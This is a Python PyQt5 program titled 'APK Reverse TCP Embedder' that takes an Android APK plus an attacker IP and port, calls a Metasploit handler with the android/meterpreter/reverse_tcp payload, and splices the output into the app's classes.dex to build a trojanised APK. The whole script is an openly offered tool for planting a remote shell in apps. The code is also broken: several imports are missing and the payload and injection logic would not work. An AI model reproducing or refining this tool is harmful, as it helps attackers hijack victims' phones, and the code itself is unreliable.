import sys
from PyQt5.QtWidgets import (
    QApplication,
    QWidget,
    QLabel,
    QLineEdit,
    QPushButton,
    QFileDialog,
    QProgressDialog,
    QMessageBox,
)
from msfconsole import MsfConsole
from zipfile import ZipFile

# Initialize MSFConsole
console = MsfConsole()


def embed_reverse_tcp():
    apk_path = apk_file_path.text()
    ip_address = ip_address_field.text()
    port = port_field.text()

    # Validate file extension
    if not apk_path.endswith(".apk"):
        QMessageBox.warning(window, "Invalid File Format", "Please select an APK file.")
        return

    # Generate reverse TCP payload using msfvenom
    payload = console.execute(
        f"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip_address}; set LPORT {port}; run"
    )

    # Write the payload to a temporary file
    payload_path = "payload.bin"
    with open(payload_path, "wb") as payload_file:
        payload_file.write(payload)

    # Embed the payload into the APK file
    progress_dialog = QProgressDialog("Embedding Reverse TCP...", "Cancel", 0, 100, window)
    progress_dialog.setWindowModality(Qt.WindowModal)

    for i in range(100):
        progress_dialog.setValue(i)
        QApplication.processEvents()

        if progress_dialog.wasCanceled():
            break

    # Embed the payload (replace this with actual embedding code)
    output_path = "embedded.apk"
    embed_payload(apk_path, payload_path, output_path)

    if progress_dialog.wasCanceled():
        QMessageBox.information(window, "Embedding Canceled", "Embedding process was canceled.")
    else:
        QMessageBox.information(window, "Embedding Successful", "Reverse TCP module embedded successfully!\nEmbedded APK saved to: embedded.apk")

        # Open the file location
        os.startfile(os.path.abspath("embedded.apk"))

    progress_dialog.close()

def embed_payload(apk_path, payload_path, output_path):
    """Embeds a payload generated by msfvenom into an APK file.

    Args:
        apk_path: Path to the APK file.
        payload_path: Path to the payload file generated by msfvenom.
        output_path: Path to the output APK file.
    """
    import shutil

    # Temporary directory to extract APK contents
    temp_dir = "temp_apk_extract"
    shutil.rmtree(temp_dir, ignore_errors=True)
    os.makedirs(temp_dir)

    try:
        # Extract APK contents
        with ZipFile(apk_path, "r") as apk:
            apk.extractall(temp_dir)

        # Inject payload into classes.dex
        classes_dex_path = os.path.join(temp_dir, "classes.dex")
        with open(classes_dex_path, "rb") as dex_file:
            dex_data = dex_file.read()

            # Marker for DEX file header magic number
            marker = b"dex\n035\x00"

            # Find the position of the marker within the dex data
            marker_pos = dex_data.find(marker)
            if marker_pos == -1:
                raise ValueError("Marker not found in classes.dex")

            # Read the payload
            with open(payload_path, "rb") as payload_file:
                payload_data = payload_file.read()

            # Calculate the length difference between the payload and the marker
            payload_length_diff = len(payload_data) - len(marker)

            # Replace the marker with the payload
            dex_data = dex_data[:marker_pos] + payload_data + dex_data[marker_pos + len(marker):]

        # Write the modified classes.dex back
        with open(classes_dex_path, "wb") as dex_file:
            dex_file.write(dex_data)

        # Create a new APK with the modified classes.dex
        with ZipFile(output_path, "w") as output_apk:
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    rel_path = os.path.relpath(file_path, temp_dir)
                    output_apk.write(file_path, rel_path)

        success = True

    except FileNotFoundError:
        success = False
        print("File not found. Check the paths provided.")
    except ValueError as ve:
        success = False
        print("Error:", ve)
    except Exception as e:
        success = False
        print("Unexpected error:", e)

    finally:
        # Clean up temporary directory
        shutil.rmtree(temp_dir, ignore_errors=True)

    return success


# Create main application window
app = QApplication(sys.argv)
window = QWidget()
window.setWindowTitle("APK Reverse TCP Embedder")

# Create file chooser label and field
apk_file_label = QLabel("APK File:")
apk_file_path = QLineEdit()
choose_apk_button = QPushButton("Choose File")
choose_apk_button.clicked.connect(lambda: apk_file_path.setText(QFileDialog.getOpenFileName()[0]))

# Create IP address label and field
ip_address_label = QLabel("IP Address:")
ip_address_field = QLineEdit()

# Create port label and field
port_label = QLabel("Port:")
port_field = QLineEdit()

# Create embed button
embed_button = QPushButton("Embed Reverse TCP")
embed_button.clicked.connect(embed_reverse_tcp)

# Create success label
success_label = QLabel("")

# Layout widgets
layout = QVBoxLayout()
layout.addWidget(apk_file_label)
layout.addWidget(apk_file_path)
layout.addWidget(choose_apk_button)
layout.addWidget(ip_address_label)
layout.addWidget(ip_address_field)
layout.addWidget(port_label)
layout.addWidget(port_field)
layout.addWidget(embed_button)
layout.addWidget(success_label)

window.setLayout(layout)
window.show()

sys.exit(app.exec_()) 
